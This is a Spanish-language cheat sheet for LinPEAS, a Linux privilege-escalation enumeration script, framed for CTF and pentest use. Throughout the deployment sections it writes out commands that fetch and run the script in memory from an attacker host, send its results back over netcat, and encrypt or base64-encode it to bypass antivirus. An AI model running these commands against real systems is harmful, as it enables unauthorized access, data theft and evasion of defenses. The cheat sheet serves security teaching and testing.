LinPEAS es un script de enumeración para encontrar vectores de escalada de privilegios en sistemas Linux, Unix-like y MacOS.
No explota vulnerabilidades directamente: recolecta información, detecta configuraciones débiles y marca posibles caminos para obtener privilegios más altos.

---

## Tipos de binarios y scripts

* **linpeas\_fat.sh** → todos los chequeos + herramientas externas embebidas en base64. Tamaño grande.
* **linpeas.sh** (default) → todos los chequeos + solo *linux exploit suggester* embebido.
* **linpeas\_small.sh** → chequeos más importantes, más rápido y pequeño.

---

## Modos de uso y despliegue

### Descarga y ejecución remota

```bash
# Desde GitHub (sin guardar en disco)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Transferencia en LAN

```bash
# Atacante
sudo python3 -m http.server 80
# Víctima
curl 10.10.10.10/linpeas.sh | sh
```

### Sin `curl`

```bash
# Atacante
sudo nc -q 5 -lvnp 80 < linpeas.sh
# Víctima
cat < /dev/tcp/10.10.10.10/80 | sh
```

### Ejecución y envío de resultados

```bash
# Atacante
nc -lvnp 9002 | tee linpeas.out
# Víctima
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
```

---

## Parámetros clave

* **`-a`** → todos los chequeos (bruteforce usuarios, buscar más hashes, monitorizar procesos).
* **`-r`** → búsqueda por regex (API keys, tokens, contraseñas).
* **`-s`** → modo rápido y sigiloso (omite chequeos pesados, nada se escribe a disco).
* **`-P <pass>`** → contraseña para usar en `sudo -l` y brute force con `su`.
* **`-D`** → modo debug.
* **`-o <checks>`** → ejecutar solo ciertos módulos, ej.:

```bash
linpeas.sh -o system_information,network_information
```

* **`-f <ruta>`** → analizar un filesystem montado o carpeta (firmwares, backups).
* **`-d/-p/-i`** → descubrimiento y escaneo de red (fping/nc).

---

## AV Bypass

* **AES + OpenSSL**

```bash
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:Clave -in linpeas.sh -out lp.enc
# En víctima
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:Clave | sh
```

* **Base64**

```bash
base64 -w0 linpeas.sh > lp.enc
# En víctima
curl 10.10.10.10/lp.enc | base64 -d | sh
```

---

## Resultados y colores

* **Rojo/Amarillo** → alta probabilidad de PE.
* **Rojo** → sospechoso.
* **Verde** → seguro conocido.
* **Azul** → usuarios sin shell / dispositivos montados.
* **Cian claro** → usuarios con shell.
* **Magenta claro** → usuario actual.

---

## Uso recomendado en CTF o pentest interno

```bash
./linpeas.sh -a -r > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt
```

Esto maximiza detecciones (incluye regex, brute force, cron monitoring) y mantiene colores.

---
---
---

### Flujo básico

1. **Descargas LinPEAS en tu máquina atacante**

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

2. **Levantas un servicio para compartirlo**
   Ejemplo con HTTP simple:

```bash
sudo python3 -m http.server 80
```

3. **Desde la víctima lo ejecutas directamente en memoria**

```bash
curl http://<IP-atacante>/linpeas.sh | sh
```

Esto descarga y ejecuta LinPEAS sin guardarlo en disco (menos rastros).

---

### Puntos clave

* No se “instala” nada, solo se transfiere o ejecuta.
* Puedes servirlo por HTTP, Netcat, SMB, etc.
* También puedes copiarlo manualmente si ya tienes acceso al sistema y luego ejecutarlo localmente.

---
